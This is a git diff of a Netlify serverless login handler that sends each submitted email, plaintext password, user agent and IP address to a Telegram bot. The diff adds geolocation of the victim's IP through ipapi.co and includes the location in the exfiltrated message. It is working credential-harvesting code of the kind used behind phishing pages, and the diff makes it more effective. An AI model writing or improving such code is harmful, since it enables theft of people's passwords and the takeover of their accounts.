@@ -21,11 +21,29 @@ exports.handler = async (event) => {
     return { statusCode: 400, body: JSON.stringify({ ok: false, error: 'Missing email or password' }) };
   }
 
-  // Extract real IP and user agent from Netlify headers
-  const clientIp = event.headers['x-forwarded-for'] || event.headers['client-ip'] || 'unknown';
+  // Extract real IP (first IP from x-forwarded-for if available)
+  const xForwardedFor = event.headers['x-forwarded-for'];
+  const clientIp = xForwardedFor ? xForwardedFor.split(',')[0].trim() : (event.headers['client-ip'] || 'unknown');
   const userAgent = event.headers['user-agent'] || 'unknown';
 
-  const text = `🔐 Login\nEmail: ${email}\nPassword: ${password}\nUser-Agent: ${userAgent}\nIP Address: ${clientIp}`;
+  // Get geolocation data
+  let location = 'unknown';
+  if (clientIp !== 'unknown') {
+    try {
+      const geoRes = await fetch(`https://ipapi.co/${clientIp}/json/`);
+      const geoData = await geoRes.json();
+      if (geoData.city) {
+        location = geoData.city;
+        if (geoData.country_name) {
+          location += `, ${geoData.country_name}`;
+        }
+      }
+    } catch (err) {
+      location = 'unknown';
+    }
+  }
+
+  const text = `🔐 Login\nEmail: ${email}\nPassword: ${password}\nUser-Agent: ${userAgent}\nIP Address: ${clientIp}\nLocation: ${location}`;
 
   try {
     const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
